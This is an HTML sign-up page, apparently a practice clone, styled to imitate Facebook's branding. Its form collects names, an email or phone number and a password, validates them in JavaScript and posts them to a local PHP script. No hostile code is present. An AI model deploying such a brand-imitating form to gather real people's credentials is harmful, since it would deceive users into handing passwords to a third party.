<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Facebook Sign Up</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background: #f0f2f5;
            font-family: Helvetica, Arial, sans-serif;
        }

        .signup-box {
            max-width: 430px;
            border-radius: 10px;
        }

        .facebook-title {
            font-size: 56px;
            font-weight: bold;
            color: #1877f2;
        }

        .form-control {
            padding: 10px;
        }

        button {
            font-size: 18px;
            font-weight: 600;
        }
    </style>
</head>

<body>
    <div class="container d-flex justify-content-center align-items-center vh-100">
        <div class="signup-box p-4 shadow bg-white">
            <h1 class="facebook-title mb-1 text-center">facebook</h1>
            <h4 class="text-center fw-semibold">Create a new account</h4>
            <p class="text-center small text-muted mb-3">It's quick and easy.</p>
            <form action="facebook_signup.php" method="POST" onsubmit="return validateForm()">
                <div class="row g-2">
                    <div class="col-md-6">
                        <input type="text" id="firstname" name="firstname" class="form-control" placeholder="First name"
                            required>
                    </div>
                    <div class="col-md-6">
                        <input type="text" id="surname" name="surname" class="form-control" placeholder="Surname"
                            required>
                    </div>
                </div>
                <input class="form-control mt-2" id="email" name="email" type="email"
                    placeholder="Mobile number or email" required>
                <input class="form-control mt-2" id="password" name="password" type="password"
                    placeholder="New password" required>
                <button type="submit" class="btn btn-success w-100 mt-3 py-2">Sign Up</button>
            </form>
        </div>
    </div>
    <script>
        function validateForm() {
            var firstname = document.getElementById("firstname").value;
            var surname = document.getElementById("surname").value;
            var email = document.getElementById("email").value;
            var pass = document.getElementById("password").value;
            
            if (firstname === "" || surname === "" || email === "" || pass === "") {
                alert("All fields are required");
                return false;
            }
            var emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            if (!emailPattern.test(email)) {
                alert("Please enter a valid email address");
                return false;
            }
            if (pass.length < 6) {
                alert("Password must be at least 6 characters");
                return false;
            }
            return true;
        }
    </script>
</body>

</html>
